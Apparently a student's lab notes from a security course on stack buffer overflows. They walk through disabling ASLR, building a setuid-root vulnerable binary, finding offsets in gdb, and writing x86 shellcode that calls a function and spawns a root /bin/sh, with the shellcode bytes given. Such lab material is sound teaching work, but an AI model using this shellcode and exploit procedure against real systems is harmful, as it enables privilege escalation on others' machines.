# Buffer Overflow

![](https://scontent.xx.fbcdn.net/v/t1.15752-9/287382801_1012708796106310_3393263325642954415_n.png?stp=dst-png_s480x480&_nc_cat=104&ccb=1-7&_nc_sid=aee45a&_nc_ohc=OEfE7TGvRbcAX9Lwnqo&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AVJaBQXkeTQc3PbfYqHvYtXJEhUZnHG_3LUF_EvomUPjPQ&oe=62D10C9F)


![](https://scontent.xx.fbcdn.net/v/t1.15752-9/284937695_8397444896947802_7098575315767581280_n.png?stp=dst-png_p206x206&_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=h_6gXJaQYfsAX87Bvx-&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AVKzKVJLo4b6r2DPyj6_3K_JmVtxA9HT29wY-DC3cdIulw&oe=62D35345)

![](https://scontent.xx.fbcdn.net/v/t1.15752-9/285364149_1209590779795497_2438689606973803339_n.png?stp=dst-png_p206x206&_nc_cat=105&ccb=1-7&_nc_sid=aee45a&_nc_ohc=FEFsuA50wucAX_aWkCe&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AVKyLOeKgkxINCyuvAc6lFEvPwXVLGFWX6CUa5Cp0N2uNA&oe=62D361AE)


# GDB: Important Points
- ```next``` move to the next instruction
- ```stepi``` move to the next assembly instruction
- ```disas [Function]``` disassebles a specific function
- ```break [Function] ``` or ```break *address``` set a breakpoint
- Regarding setting breakpoints and getting the correct value of ```ebp``` see lecture **buffer_overflow_demo.mp4** (from 11:50)
    - Set breakpoints appropriately for getting the correct value of stack pointer ```ebp```
    - After getting to that breakpoint, it is better to use a ```next``` command to make sure that the value of ```ebp``` is updated properly

# Assembly: Important Points
- The return value of a function is stored in ```eax```


# Task
Prepare a payload (e.g badfile) which will cause the program to call the the *secret* function and then open a shell with root's privilege when executed by other users



# Step by Step Procedure

## Step 1: Setting up the environment and compiling target C file  
```bash
# setting up environments and permissions
sudo sysctl -w kernel.randomize_va_space=0
sudo ln -sf /bin/zsh /bin/sh
# set user as root
sudo su
# compiling the target file as root
gcc -m32 -o stack -z execstack -fno-stack-protector stack.c
sudo chown root stack
sudo chmod 4755 stack
# set user as a normal user (not root)
su seed
# compiling the target file with "-g" for gdb
gcc -m32 -o stack_dbg -g -z execstack -fno-stack-protector stack.c
```

## Step 2: Getting the return address and buffer address using gdb

```bash
# run gdb
$ gdb stack_dbg
# set a breakpoint at foo
gdb-peda$ b foo
gdb-peda$ run
# set a breakpoint ar bof
gdb-peda$ b bof
gdb-peda$ continue
gdb-peda$ next
# print the value of ebp register (stack fram pointer)
# i.e. top of the current stack frame I guess
gdb-peda$ p $ebp
$1 = (void*) 0xffffb828

# print the address of buffer
gdb-peda$ p &buffer     
$2 = (char(*)[614])0xffffb592

# print in decimal (/d) the address difference
gdb-peda$ p /d 0xb828 - 0xb592
$3 = 662

# get the starting address of the function secret
gdb-peda$ disas secret
Dump of assembler code for function secret:
   0x565562e5 <+0>:     endbr32
   0x565562e9 <+4>:     push ebp
   ...
End of assembler dump.
```


## Step 1: Creating *payload*/*badfile*
- The payload or the badfile is usually written in assembly 
- The corresponding assembly code is translated to machine code
- The machine code is used to create a *badfile*
- Our intention is to **make a call to the function *secret*** and **open a shell with root privilege**


### Step 1.1: Make a call to the function *secret*
```x86asm
mov ebx, 0x565562e5
call ebx
```
- ```0x565562e5``` is the address of the function ```secret``` which we figured out using GDB


### Step 1.2: Open a shell with root privilege
```x86asm
xor  eax, eax 
push eax          ; Use 0 to terminate the string
push "//sh"
push "/bin"
mov  ebx, esp     ; Get the string address

; Construct the argument array argv[]
push eax          ; argv[1] = 0
push ebx          ; argv[0] points "/bin//sh"
mov  ecx, esp     ; Get the address of argv[]

; For environment variable 
xor  edx, edx     ; No env variables 

; Invoke execve()
xor  eax, eax     ; eax = 0x00000000
mov   al, 0x0b    ; eax = 0x0000000b
int 0x80
```

The final output should look something like this
```x86asm
section .text
  global _start
    _start:
      mov ebx, 0x565562e5
      call ebx

      ; code to open a shell
      xor  eax, eax 
      push eax          
      push "//sh"
      push "/bin"
      mov  ebx, esp     
      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]
      ; For environment variable 
      xor  edx, edx     ; No env variables 
      ; Invoke execve()
      xor  eax, eax     ; eax = 0x00000000
      mov   al, 0x0b    ; eax = 0x0000000b
      int 0x80
```

## Step 2: Generating Machine Code for payload

### Method 1: 

- Use the following two commands to generate the machine code

```properties
nasm -f elf32 <asm_filename>.s -o <asm_filename>.o
xxd -p -c 20 <asm_filename>.o
```

- Copy the machine code and format it using **convert.py**. Paste the copied machine code into the variable ```ori_sh``` on line no 5

```python
ori_sh ="""
bbe5625556ffd331
c050682f2f7368682f62696e89e3505389e131d2
31c0b00bcd80
"""
```

- Run **convert.py** to get the formattd machine code


### Method 2: 
- Use [this link](https://defuse.ca/online-x86-assembler.htm) to directly generate formatted machine code. Only use ```mov```, ```push```, ```xor``` etc. commands


### Machine code for opening a shell:
```
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80" 
```
